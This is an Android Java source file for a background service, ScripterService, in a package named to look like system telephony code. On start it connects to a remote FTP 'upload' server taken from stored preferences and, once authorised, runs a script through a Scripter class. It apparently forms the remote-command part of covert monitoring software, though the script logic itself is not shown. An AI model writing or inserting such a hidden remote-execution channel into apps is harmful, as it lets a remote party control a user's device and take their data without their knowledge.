package com.telephony.services;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class ScripterService extends Service {
	private PreferenceUtils sPref = null;
	private ExecutorService es;
	private MyFTPClient ftp;
	private Scripter scp;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {

		super.onCreate();
		es = Executors.newFixedThreadPool(1);
		sPref = PreferenceUtils.getInstance(this);
		Log.d(Utils.LOG_TAG, getClass().getName() + " Create");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		es.execute(new RunService(intent, flags, startId, this));

		return super.onStartCommand(intent, flags, startId);

	}

	private class RunService implements Runnable {
		private final Intent intent;
		private final int flags;
		private final int startId;
		private final Context context;

		public RunService(Intent intent, int flags, int startId, Context context) {
			this.intent = intent;
			this.flags = flags;
			this.startId = startId;
			this.context = context;
		}

		public void run() {
			try {
				if (sPref.getRootDir().exists() && (Utils.updateExternalStorageState() == Utils.MEDIA_MOUNTED)) {
					ftp = new MyFTPClient();
					ftp.connect(sPref.getUploadUrl());
					if (ftp.isAuthorized) {
						scp = new Scripter(context, ftp);
						scp.execScript();
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				stop();
			}
		}

		public void stop() {
			try {
				if (ftp != null) {
					ftp.disconnect();
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			stopSelf();
		}

	}

	@Override
	public void onDestroy() {

		super.onDestroy();
		es = null;
		sPref = null;
		ftp = null;
		Log.d(Utils.LOG_TAG, getClass().getName() + " Destroy");
	}

}
